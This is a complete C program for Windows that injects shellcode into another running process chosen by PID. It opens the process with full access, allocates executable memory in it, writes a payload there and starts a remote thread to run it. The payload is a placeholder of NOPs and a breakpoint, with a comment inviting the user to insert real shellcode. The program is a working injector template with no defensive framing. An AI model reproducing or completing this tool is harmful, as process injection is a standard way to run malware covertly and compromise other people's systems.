#include <stdio.h>
#include <windows.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

DWORD targetPID = 0;
HANDLE processHandle = NULL, threadHandle = NULL;
LPVOID remoteBuffer = NULL;

int main(int argc, char* argv[]) {
    if (argc < 2) {
        info("Usage: program.exe <PID>");
        return EXIT_FAILURE;
    }

    unsigned char payload[] = 
        "\x90\x90\x90\x90" // <-- Your actual shellcode goes here
        "\xcc";             // <-- INT3 breakpoint (example)
    size_t payloadSize = sizeof(payload) - 1;

    targetPID = atoi(argv[1]);

    processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        targetPID
    );

    if (processHandle == NULL) {
        warn("Failed to get a handle to the process (Error Code: %ld)", GetLastError());
        return EXIT_FAILURE;
    }

    okay("Successfully got a handle to the process %p", processHandle);

    remoteBuffer = VirtualAllocEx(
        processHandle,
        NULL,
        payloadSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remoteBuffer == NULL) {
        warn("Failed to allocate memory in the process (Error Code: %ld)", GetLastError());
        CloseHandle(processHandle);
        return EXIT_FAILURE;
    }

    if (WriteProcessMemory(
        processHandle,
        remoteBuffer,
        payload,
        payloadSize,
        NULL
    ) == 0) {
        warn("Failed to write to the process (Error Code: %ld)", GetLastError());
        CloseHandle(processHandle);
        return EXIT_FAILURE;
    }

    okay("Successfully wrote (%zu bytes) to the process", payloadSize);

    threadHandle = CreateRemoteThread(
        processHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteBuffer,
        NULL,
        0,
        NULL
    );

    if (threadHandle == NULL) {
        warn("Failed to create a thread in the process (Error Code: %ld)", GetLastError());
        CloseHandle(processHandle);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(threadHandle, INFINITE);
    okay("Successfully created and ran remote thread (%p)", threadHandle);

    info("Cleaning up...");
    CloseHandle(processHandle);
    CloseHandle(threadHandle);

    return EXIT_SUCCESS;
}
